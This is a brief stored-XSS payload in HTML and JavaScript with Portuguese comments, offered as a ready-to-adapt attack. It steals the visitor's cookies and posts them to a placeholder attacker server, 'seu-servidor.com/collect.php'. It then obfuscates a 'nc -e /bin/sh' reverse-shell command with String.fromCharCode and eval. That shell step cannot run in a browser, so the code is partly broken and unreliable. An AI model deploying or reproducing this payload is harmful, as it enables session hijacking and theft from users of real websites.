<!-- Exemplo de Payload XSS Armazenado -->
<script>
  // Capturar informações (cookie, sessionId, etc.)
  const info = document.cookie;

  // Enviar para o seu servidor (substitua a URL pelo seu servidor)
  const url = 'http://seu-servidor.com/collect.php';
  const params = `info=${encodeURIComponent(info)}`;

  // Criar uma requisição HTTP para enviar as informações
  const xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xhr.send(params);

  // Executar um comando na shell remota (substitua pelo seu comando)
  const command = 'nc -e /bin/sh seu-endereco-IP seu-porta';
  const shellScript = document.createElement('script');
  shellScript.innerHTML = `eval(String.fromCharCode(${command.split('').map(c => c.charCodeAt(0)).join(',')}))`;
  document.body.appendChild(shellScript);
</script>
